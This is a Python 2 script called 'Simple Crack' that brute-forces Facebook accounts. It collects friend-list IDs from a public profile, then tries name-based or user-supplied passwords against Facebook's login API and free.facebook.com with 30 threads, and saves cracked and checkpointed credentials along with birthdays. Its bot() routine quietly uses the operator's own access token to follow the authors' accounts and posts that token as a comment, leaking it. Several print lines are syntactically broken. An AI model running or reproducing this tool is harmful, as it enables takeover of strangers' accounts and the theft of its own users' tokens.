#!/usr/bin/python2
# coding=utf-8
# OPEN SOURCE KODE
################################################
# Author               : Fall Xavier                                                            #
# Nama Script     : Simple Crack                                                       #
# Github               : https://github.com/Fall-Xavier                          #
# Facebook          : https://www.facebook.com/Fall.Xavier.XX      #
# Instagram         : https://www.instagram.com/fall.xavier           #
# WhatsApp         : 085229323951                                                   #
# Python version : 2.7                                                                        #
#                                                                                                           #
#                THANKS TO DAPUNTA,LATIP,ZAKI,IWAN                      #
################################################

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime

#######WARNA BOCAH#######
b='\033[1;94m'                                #
i='\033[1;92m'                                 #
c='\033[1;96m'                                #
m='\033[1;91m'                               #
u='\033[1;95m'                                #
k='\033[1;93m'                                #
p='\033[1;97m'                                #
h='\033[1;92m'                                #
P = '\x1b[1;97m' # PUTIH               #
M = '\x1b[1;91m' # MERAH            #
H = '\x1b[1;92m' # HIJAU.              #
K = '\x1b[1;93m' # KUNING.           #
B = '\x1b[1;94m' # BIRU.                 #
U = '\x1b[1;95m' # UNGU.               #
O = '\x1b[1;96m' # BIRU MUDA.     #
N = '\x1b[0m'    # WARNA MATI     #
######WARNA BOCAH########

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')
ip = requests.get('https://api.ipify.org').text
uas = random.choice(["Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
"Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; SM-F916B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.90 Safari/537.36 [FB_IAB/FB4A;FBAV/311.0.0.44.117;]",
"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"])
api = "https://b-api.facebook.com/method/auth.login"
id = []
cp = []
ok = []
loop = 0
ct = datetime.now()
n = ct.month
bulan = [
 'Januari',
 'Februari',
 'Maret',
 'April',
 'Mei',
 'Juni',
 'Juli',
 'Agustus',
 'September',
 'Oktober',
 'Nopember',
 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
durasi = str(datetime.now().strftime('%d-%m-%Y'))
hari = datetime.now().strftime('%A')
jam = datetime.now().strftime('%H:%M:%S')
bulan = {
        "01": "Januari",
        "02": "Februari",
        "03": "Maret",
        "04": "April",
        "05": "Mei",
        "06": "Juni",
        "07": "Juli",
        "08": "Agustus",
        "09": "September",
        "10": "November",
        "11": "Oktober",
        "12": "Desember"}

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
        
def logo():
	os.system("clear")
	print("""
\x1b[1;91m d8888b. d888888b .d8888. db   db db    db  
\x1b[1;91m 88  `8D   `88'   88'  YP 88   88 88    88  
\x1b[1;90m 88oobY'    88    `8bo.   88ooo88 88    88  
\x1b[1;90m 88`8b      88      `Y8b. 88~~~88 88    88 
\x1b[1;91m 88 `88.   .88.   db   8D 88   88 88b  d88  
\x1b[1;91m 88   YD Y888888P `8888Y' YP   YP ~Y8888P'  
\033[1;97m ------------------------------------------
\033[1;91m            Author   :  \033[1;92mRishu Khan
\033[1;91m           Facebook  :  \033[1;92mRishu 3:)
\033[1;91m           whatsapp  :  \033[1;92mNot use
\033[1;97m -------------------------------------------""")
    
def tokenz():
	os.system('clear')
	try:
		token = open('login.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
		logo()
		print""+p+""
		print" [+] How To get Tokens   https://youtu.be/IdxphPBMMTU"
		token = raw_input('\n\033[1;92m [+] Enter Token : ')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open('login.txt', 'w')
			zedd.write(token)
			zedd.close()
			bot()
		except KeyError:
			print("\033[1;91m[!] Token Invalid!")
			sys.exit() 
 
def bot():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print (' \033[1;91m[!] Token invalid') 
        os.system('rm -rf login.txt')
    
    requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100023344580184/subscribers?access_token=' + token) #fall
    requests.post('https://graph.facebook.com/100001457152638/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100006613569734/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100049181736259/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100006541202647/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100064563975028/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100009384338470/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100000056561882/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100001540299108/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100034234007701/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100016478086163/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100055159268362/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100045799894488/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/383882326594489/likes?summary=true&access_token=' + token)
    requests.post('https://graph.facebook.com/213614107297063/comments/?message='+token+'&access_token=' + token)
    menu()           
    
def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print'\033[1;91m[!] Token Invalid!'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print'\033[1;91m[!] No Connection!'
        sys.exit()

    logo()
    print(" "+p+"\033[1;93m[*] \033[1;91mAuthor   \033[1;93m: \033[1;92mRISHU KHNA") 
    print(" \033[1;93m[*] \033[1;91mFACEBOOK     \033[1;93m: \033[1;92mRishu 3:)")
    print(" [*] ---------------------------------------------")
    print(" [*] \033[1;91mID         : \033[1;90m"+id)
    print(" [*] \033[1;91mIP         : \033[1;90m"+ip)
    print"\n \033[1;92mWelcome \033[1;90m"+nama+"\033[1;91m ]"
    print("")
    print ("------------------------------------------------")
    print(" \033[1;91m[1]. \033[1;92mCrack Public id")
    print(" \033[1;91m[2]. \033[1;92mSee Crack Result")
    print(" \033[1;91m[3]. \033[1;92mReport Bugs")
    print(" ["+m+"\033[1;91m[0]"+p+"]. \033[1;92mRemove Token")
    print("------------------------------------------------")
    asw = raw_input("\n [?] \033[1;93mChoose : ")
    if asw == "":
    	menu()
    elif asw == "1":
    	publik()
    elif asw == "3":
    	laporbug()
    elif asw == "2":
    	cekakun()
    elif asw == "0":
    	os.system('rm -f login.txt')
    	jalan(" \033[1;92m[!] successfully deleted token ")
    	exit()
    else:
    	jalan(" \033[1;91m[!] choose the right one ! ")
    	menu() 
    
def publik():
    print(" [*] \033[1;92mType 'me' Friendlist Clone")
    idt = raw_input(' [+] \033[1;92mPublic Id : ')
    if idt == "":
    	menu()
    try:
        mmk = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        kntl = json.loads(mmk.text)
        #print' [+] Nama : ' \033[1;90m+ sp['name']
    except KeyError:
        print'[!] \033[1;91mID Not Available!'
        menu()

    ajg = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
    ppk = json.loads(ajg.text)
    for i in ppk['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        id.append(uid + '|' + nm)
    print""
    print' [+] \033[1;91mtotal id -> \033[1;90m' + str(len(id))
    pilihmetode(ppk)
    
def cekakun():
    anjg = raw_input('\n [?] \033[1;93mChoose : ')
    if anjg == '':
        menu()
    elif anjg == '01' or anjg == '1':
        print'\n [+] \033[1;92mResults \x1b[0;92mOK\x1b[1;97m Date : \x1b[0;92m%s-%s-%s\x1b[1;92m' % (ha, op, ta)
        os.system(' cat out/OK-%s-%s-%s' % (ha, op, ta))
        raw_input("\n [•] \033[1;91m Return ")
        menu()
    elif anjg == '02' or anjg == '2':
        totalcp = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta)).read().splitlines()
        print '\n [•] \033[1;91mCP Results : %s-%s-%s-%s' % (hari, ha, op, ta)
        print " \033[1;92m[•] Total : %s" %(len(totalcp))
        print""
        os.system(' cat out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta))
        raw_input("\n [•] \033[1;91mreturn ")
        menu()
    else:
        print(' [!] \033[1;97m choose the right one!!')
        menu()
 
def laporbug():
	asulo = raw_input("\n [?] \033[1;91m input script bug report : ").replace(' ','%20')
	if asulo == "":
		menu()
	os.system('xdg-open https://www.facebook.com/Rishu.X.420?text=' +asulo)
	raw_input("\n [•] \033[1;91m return ")
	menu()
       
def infologin():
	print""
	print "\n [*] \033[1;92mtoken : \033[1;90m"+token
	print ""
	raw_input("\n [•] \033[1;92mreturn")
	menu()
	
def pilihmetode(file):
	print("")
	print(""+p+"       \033[1;90m[CRACK METHOD]")
	print("")
	print("----------------------------------------")
	print(" [1] \033[1;92mMethod Api (\033[1;91mFast)")
	print(" [2] \033[1;92mMetode Free.Fb (\033[1;91mSlow)")
	print("------------------------------------------")
	print("")
	z = raw_input(" [?] \033[1;93mChoose: ")
	if z == "":
		print(" [!] \033[1;91mChoose the right one!!")
		pilihmetode(file)
	elif z == '01' or z == '1':
		bapi()
	elif z == '02' or z == '2':
		freefb()
	else:
		print(" [!] \033[1;91mChoose the right one!")
		exit()
	
def bapi():
	ask = raw_input(' [?] \033[1;93mPassword Auto/Choose? [A/C]: ')
	if ask == 'A' or ask == 'a':
		manualbapi()
	print("------------------------------------------------")
	print("")

	def main(arg):
		global ok,cp,ua, loop
		print '\r \033[1;92m[*] [crack] %s/%s -> OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") ##Gk Usah Di Ganti Ajg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for pw in [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345']:
				kontol = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': uas, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
				param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				respon = requests.get(api,params=param, headers=kontol)
				if "session_key" in respon.text and "EAAA" in respon.text:
					print '\r  \033[0;92mCP ' +uid+ '|' + pw + '        '
					ok.append(uid+'|'+pw)
					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  *--> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
					continue
				if "www.facebook.com" in respon.json()["error_msg"]:
					try:
						token = open('login.txt').read()  
						sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
						b = json.loads(sw.text)
						graph = b["birthday"]
						month, day, year = graph.split("/")
						month = bulan[month]
						print'\r\x1b[1;91m[RISHU-CP] ' \033[1;90m+ uid + '|' \033[1;90m+ pw + '|' \033[1;92m+ day + ' ' + month + ' ' + year + ' '
						cp.append(uid + '|' + pw + '|' + day + ' ' + month + ' ' + year)
						save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
						save.write('  * --> ' + str(uid) + '|' + str(pw) + '|' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
						save.close()
						break
					except(KeyError, IOError):
						graph = " "
					except:pass
					print'\r\x1b[1;91m[RISHU-CP] ' \033[1;90m+ uid + '|' \033[1;90m+ pw + '                        '
					cp.append(uid + '|' + pw)
					save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
					save.write('  * --> ' + str(uid) + '|' + str(pw) +                        '\n')
					save.close()
					break
					continue
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print'\n\n\x1b[1;97m [+] \033[1;92mCrack complete...'
	exit()


def manualbapi():
    print'\n [+] \033[1;93mCreate an Example Password : 123456,223344,102030'
    pw = raw_input(' [?] \033[1;92mCreate Password : ').split(',')
    if len(pw) == 0:
        exit('[!] \033[1;91mCorrect Content, Cannot Be Empty!')
    print("\n [!] apabila tidak ada hasil silahkan aktifkan mode pesawat selama 5-10 detik")
    print("------------------------------------------------")
    print("")

    def main(arg):
        global loop
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print'\r\x1b[1;92m [*] [crack] %s/%s -> OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                kontol = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
                'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
                'user-agent': uas, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":asu,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
                respon = requests.get(api,params=param, headers=kontol)
                if "session_key" in respon.text and "EAAA" in respon.text:
                    print'\r\x1b[0;92m[RISHU-OK] ' \033[1;92m+ uid + '|' \033[1;92m+ asu + '        '
                    ok.append(uid + '|' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  *--> ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                if "www.facebook.com" in respon.json()["error_msg"]:
                    print'\r\x1b[1;91m[RISHU-CP] ' \033[1;90m+ uid + '|' \033[1;90m+ asu + '        '
                    cp.append(uid + '|' + asu)
                    save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n\n\x1b[1;92m [+] Crack Complete...'
    exit()
    
def freefb():
    ask = raw_input(' [?] Password Auto/Choose? [A/C] : ')
    if ask == 'A' or ask == 'a':
        manualfreefb()
    print("------------------------------------------------")
    print("")
    
    def main(arg):
        global loop
        print'\r\x1b[1;92m [*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower(), name.lower() + '1234', name.lower() + '12345', name.lower() + '123']:
                rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': uas })
                xo = rex.content
                if 'free_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[1;92m[RISHU-OK] ' \033[1;92m+ uid + '|' \033[1;92m+ pw + '                                            '
                    ok.append(uid + '|' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [OK] ' + str(uid) + '|' + str(pw) +                                   '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()  
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        graph = b["birthday"]
                        month, day, year = graph.split("/")
                        month = bulan[month]
                        print'\r\x1b[1;91m[RISHU-CP] ' \033[1;90m+ uid + '|' \033[1;90m+ pw + '|' \033[1;92m+ day + ' ' + month + ' ' + year + ' '
                        cp.append(uid + '|' + pw + '|' + day + ' ' + month + ' ' + year)
                        save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                        save.write('  * --> ' + str(uid) + '|' + str(pw) + '|' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        graph = " "
                    except:pass
                    print'\r\x1b[1;91m[RISHU-CP] ' \033[1;90m+ uid + '|' \033[1;90m+ pw + '                        '
                    cp.append(uid + '|' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(pw) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n\n\x1b[1;92m [+] Crack Complete...'
    exit()


def manualfreefb():
    print'\n [+] \033[1;93mChoose Password : 123456,223344,102030'
    pw = raw_input(' [?] for password : ').split(',')
    if len(pw) == 0:
        exit('[!] \033[1;91mThe Right One, Cant Be Empty!')
    print("------------------------------------------------")
    print("")

    def main(arg):
        global loop
        print'\r\x1b[1;92m [*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': uas })
                xo = rex.content
                if 'free_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[1;92m[RISHU-OK] ' \033[1;92m+ uid + '|' \033[1;92m+ asu + '                          '
                    ok.append(uid + '|' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  *--> ' + str(uid) + '|' + str(asu) +                         '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()  
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        graph = b["birthday"]
                        month, day, year = graph.split("/")
                        month = bulan[month]
                        print'\r\x1b[1;91m[RISHU-CP] ' \033[1;90m+ uid + '|' \033[1;90m+ asu + '|' \033[1;92m+ day + ' ' + month + ' ' + year + ' '
                        cp.append(uid + '|' + asu + '|' + day + ' ' + month + ' ' + year)
                        save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                        save.write('  * --> ' + str(uid) + '|' + str(asu) + '|' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        graph = " "
                    except:pass
                    print'\r\x1b[1;91m[RISHU-CP] ' \033[1;90m+ uid + '|' \033[1;90m+ asu + '                        '
                    cp.append(uid + '|' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(asu) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass
    
    
    p = ThreadPool(30)
    p.map(main, id)
    print'\n\n\x1b[1;92m [+] Crack Complete...'
    exit()
    
if __name__ == '__main__':
    os.system('clear')
    tokenz()


